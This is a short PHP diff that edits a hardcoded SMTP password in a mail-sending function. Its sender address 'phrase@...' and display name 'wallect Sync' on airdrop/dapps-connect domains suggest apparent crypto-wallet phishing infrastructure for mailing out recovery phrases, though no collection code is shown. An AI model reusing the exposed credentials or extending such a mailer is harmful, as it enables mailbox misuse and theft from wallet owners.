@@ -11,7 +11,7 @@ function sendMail($subject, $msg, $email) {
         $mail->Port = 465;
         $mail->SMTPAuth = true;
         $mail->Username = "phrase@airdropdappsconnect.com.ng";
-        $mail->Password = 'khariz2020@';
+        $mail->Password = 'khariz2020';
         $mail->setFrom('phrase@airdropconnect.com.ng', 'wallect Sync');
         $mail->setFromName = 'wallect Sync';
         $mail->addReplyTo("phrase@airdropdappsconnect.com.ng");
